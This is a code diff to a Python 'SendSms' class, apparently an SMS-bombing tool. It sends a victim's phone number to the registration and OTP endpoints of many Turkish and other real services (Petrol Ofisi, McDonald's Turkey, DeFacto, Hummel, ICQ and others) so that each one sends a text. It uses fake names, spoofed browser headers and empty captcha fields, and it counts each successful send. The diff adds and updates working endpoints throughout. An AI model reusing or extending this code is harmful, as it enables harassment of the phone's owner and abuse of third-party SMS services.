@@ -43,28 +43,7 @@ class SendSms():
         except:    
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> borsadirekt.com")
         
-    
-    # online.spor.istanbul--sms
-    def sporIstanbul(self):
-        try:
-            spor_istanbul = requests.post("https://online.spor.istanbul/", data={
-                "__EVENTTARGET": "",
-                "__EVENTARGUMENT": "",
-                "__VIEWSTATE": "NuQ7NYoWoRNnRpxQCvRNODax9UsgZIhcC0r4AZbsXmg4Jioa+JoJiiD66t1I2GBz50ginD5zMkIXq676JdG40fXg82na3kqqdznso4j4IGmF84I02ghGclIHm9lZWhWvVCBCkkClR5OYL3TaZcT3EcLMJR59qYe1M3P9hEZG41KqkCW4c4meStXaolnWt/Pg+A2atn56n+flQGNm+jfJXKNLxflQFJon9sjio0zUYdarQiswj4njOWjRgDKL8wuwoMf0SL0l3u6FIOe1rHEnA/C+QuAfNdRvz6xzEkZc4Q2/VPuo+1RsJtK5CSIJ9p867+XXw4O63cCNHWDUIOmlc5x3cXsIkWKVGQBRNnQNiWu0q0DlP8tr4x0zs6UNshJ/yOofvKPGYCExoq9QSwkOsPgR5lvGXJAN2O0GFbZj/eqC4cVKfWR6u5SsWY0M0kG0GNem5cAGuUnzJFqXBBoFfK21lZGnjEwpJfgOUV/d4n9uVz7Eqh0KuswMSnsEm/osg4U2FmlDTphHCAA36MKVR8GcZMabKOzIjCCKTERty0D2/9PZ9n3zJpuoWBDsY7BtVNYzWVVaASE06CRXoxmj1YhjjptGgQ47kxHDgtyNb12nPttIKb6ZkccDlXQw/XAE9sPRMaIaMYdAZC6saByIUeWNROUJ6P9TFF0PiIFoDV9+0wuQIv9y780RDYcYDhdGOKpqEabDJzDzzQo5IJEaQcpv1nFXVi3AyAVgGOhszDjSfZnAfy63bwdxeDqmawpSyYXL+rJw564dNmvj60kisflKpCWY4QIDeNL6mxd76kKwr0kn+xC8xiRDmXIYMJ7uqBS/0ALdx+NhfjBR73zVNgGw0zrCgihAyn/GCaQKT9IRK3ZzqLqi8wMtpi0rxsl7YpZmSrWHghrhgDowPIB89NOglm60nfbYwLrFdqa6LcUVA53x28HlSw6D6YkANy1HQn45GzM5gSBgiBXXoGzdZpqHOeFkq1Kym0i2j9mP7R2/YZSwfb86D1E1k4s1PGpsM6VTjytIC++6EolLRKw6V2leQaPPpNDSuiBkBmMAaxINcIEtGetxiID3DkTOfKAmIyCmKvmI+itsD1G6iNmCIVYeKzWYevffYk03ruzyQvcXq8i8ceWzOeTzxCnDSa2cioW6mHg9xKnRdoyEgBm7hka4cIrzpe//4sdbMyo2YSiOqelttJeuTxhQCOTnLtPQk0UjFwKR7rc9hu2dc9rHC8XPgV7c5LICBG9qjLXm8L/7D8UwLhjXJU5oAF95CinduMOgSTk2N4cU/x7DCnqCrdWFLsBcgHdxkzJxAuil71DcqLhUlIP/08eKdNON0vdwlKmds2rXsD+jOzLzk92ueQTrx8h+ZCkL9Zvw6sSfj2uDkMpCniPFcRRawTKc2BJDm3XFtl0nFFl022lr2zpCGgSFlVPT8z+OJw2OUTJHljHd0PuWQP7vA15GuosN4x0mKRCoRNAhXQLcKoa22nMERnJtorlzKSfVUik94mJwmOfQYJBTjHAsjnSlxb598Zspt+hJNjpvliAI121U9QCYzhTkWXvNz8xXjhpmgMcQxadZpHkQbSehmAt3dWNvarzT9Q1l+DNJLPueXhlX0nf2OHhwnCPR8d+eaCnBlQhcx+kwap6vWnYK3JUC4n96V30QoUIoAeWpv2+D/+REPc/j4GPENBHdhWV7MlajtFNNMFyhzCV1zZ0gfyGg3HMZbSfRP7ShWzM/G4YpYs33BLrznXFXaiZ9yZH6ArGjGyhfgmWCCrjSRzz7jGHGtpFLGTOdCEZSrd2J8vGh0ddhknECKzsk2yZqgEjqi5BojyVPFjX0YBlDEuCDSETLnpHsfCn8JiGSdTJ4pQYb4CrU7z6xE5bY2QJZA5b9PshxJNTH4Or8dHPlmBd8aXtHxDUb6t30LiYR+WmZMNboC3Xy0asslnsvVBmXxmzDXJa+jrzzMsek36l6kUwdGCd1mIp6FqrFD3TteyJs41ugn5zOLpGJ5u94vP8HYRpLgNOhe52HOXjvEu02tSdTraOK4Qrk390f45rTbNhpqoV4Tzkd31arG6JHt3UUb3AoOJBWRoiQ+hjfBkQJawU5arQ/bmFMkxZsEABlC0bL+mARvGWn0GPmYcRuObcBscD/Q7taSIfiMtj0IWxMq0htr9fvgSvXiNkHb16eVmn4dKVO80KpPirpoP0ACPkrqXYeXVUhgwTvH6l3PYKS94CbJ9vC72MuBtl3cxpDB+lZQdC4ACVzmeJnumnbjbjTCvUYGqQfBwYi856OGwylfRild+KMUpT5vDJUwvmM+4VJjciBsoY6oiUxAqgLmlQrpmInVbvKSBpxLNHJhj6v42vHvIdTVTVOGkUdasjtwfqXok5WqVIyCJSCOgA90746gDqJqSo0V5g6SUgiRHnfN9mBRo9vKVx8kQnmrIr12IUOCbZBfHUnd20gGYZkN1qfG+Kn3GAi6wwVqZ0=",
-                "__VIEWSTATEGENERATOR": "6369D5A1",
-                "txtCepTel": self.phone,
-                "btnCepTelDogrulamaGonder": "Gönder",
-                "g-recaptcha-response": ""
-            })
-            if spor_istanbul.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> online.spor.istanbul")
-                self.adet += 1
-            else:
-                raise
-        except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> online.spor.istanbul")
         
-
     # dsmartgo.com.tr--sms--zaman-3dk
     def dsmartgo(self):    
         dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
@@ -203,20 +182,10 @@ class SendSms():
     # petrolofisi.com.tr--sms
     def petrolOfisi(self):
         try:    
-            petrol_ofisi = requests.post("https://www.petrolofisi.com.tr/pocardservice/account/register", data={
-                "PositiveCard": "",
-                "Plate": "31ABC31",
-                "Name": "Memati",
-                "Surname": "Bas",
-                "MobilePhone": f"0{self.phone}",
-                "ContractPermission": "true",
-                "EtkContactPermission": "false",
-                "KvkkPermission": "true",
-                "IsStaticOtp": "true",
-                "Channel": "2",
-                "ApprovedKvkkVersion": "dc84233a-4c63-43d7-9787-7aa50530dd90",
-                "ApprovedContractVersion": "39537d97-6710-43be-867d-7a9c01471c13"
-            })
+            url = "https://onlineislemler.petrolofisi.com.tr:443/Authentication/Register"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://onlineislemler.petrolofisi.com.tr", "Dnt": "1", "Referer": "https://onlineislemler.petrolofisi.com.tr/authentication/login?ReturnUrl=%2F", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
+            data = {"name": "Memati", "surname": "Bas", "phone": f"0{self.phone}", "referenceCode": '', "cardNo": '', "plate": "31ABC31", "contractPermission": "true", "contactPermission": "true", "kvkkPermission": "true"}
+            petrol_ofisi = requests.post(url, headers=headers, data=data)
             if petrol_ofisi.json()["Success"] == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> petrolofisi.com.tr")
                 self.adet += 1
@@ -253,28 +222,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> otokocikinciel.com")
-        
-
-    #gediktrader.com--sms
-    def gedikTrader(self):
-        try:
-            gediktrader = requests.post("https://web.gediktrader.com/v/controllers/gedikRegistrationPhase1", data={
-                "username": "Memati",
-                "surname": "Bas",
-                "email": f"{self.random_mail}@gmail.com",
-                "password": "31ABC..abc31",
-                "phone": f"+90{self.phone}",
-                "city": "aydin",
-                "address": "asdas d",
-                "from": "registerform"
-            })
-            if gediktrader.json() == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gediktrader.com")
-                self.adet += 1 
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gediktrader.com")
          
     
     #naosstars.com--sms
@@ -314,30 +261,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ohalisaha.com")
-         
-    
-    #ardenfc.com--sms
-    def ardenfc(self):
-        try:
-            ardenfc = requests.post("https://siparis.ardenfc.com/Customer/AddTempUser", data={
-                "CountryPhoneCode": "90",
-                "Name": "Memati",
-                "Surname": "Bas",
-                "Phone": self.phone,
-                "EMail": f"{self.random_mail}@gmail.com",
-                "Password": "31ABC..abc31",
-                "ComFirmPassword": "31ABC..abc31",
-                "userContract": [
-                    "true",
-                    "false"
-                ]})
-            if ardenfc.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ardenfc.com")
-                self.adet += 1  
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ardenfc.com")
          
     
     #wmf.com.tr--sms
@@ -515,8 +438,10 @@ class SendSms():
     #rentiva.com--sms
     def rentiva(self): 
         try:
+            url = "https://rentiva.com:443/api/Account/Login"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
             json={"phone": self.phone, "phonePeriod": "never"}
-            rentiva = requests.post("https://rentiva.com:443/api/Account/Login", json=json)
+            rentiva = requests.post(url, headers=headers, json=json)
             if rentiva.json()["success"] == True:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com")
                 self.adet += 1
@@ -634,7 +559,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> yaanimail.com")  
             
             
-    # mcdonalds.com.tr
+    #mcdonalds.com.tr
     def Mcdonalds(self):
         try:
             r = requests.get(f"https://siparis.mcdonalds.com.tr/login/SendSMSOtp?phone={self.phone}&smsPermit=1&epostaPermit=1")
@@ -647,7 +572,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mcdonalds.com.tr")
             
     
-    # defacto.com.tr
+    #defacto.com.tr
     def Defacto(self):
         try:
             url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
@@ -663,7 +588,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr")
     
     
-    # mopas.com.tr
+    #mopas.com.tr
     def Mopas(self):
         try:
             r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=")
@@ -676,7 +601,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr")
             
             
-    # hummel.com.tr
+    #hummel.com.tr
     def Hummel(self):
         try:
             r = requests.get(f"https://hummel.com.tr/Uye/CheckPhoneAndSendSms?phone={self.phone}")
@@ -686,4 +611,20 @@ class SendSms():
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hummel.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hummel.com.tr")    
+     
+    
+    #icq.net
+    def Icq(self):
+        try:
+            url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
+            json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
+            r = requests.post(url, headers=headers, json=json)
+            if r.json()["status"]["code"] == 20000:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> icq.net")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> icq.net")
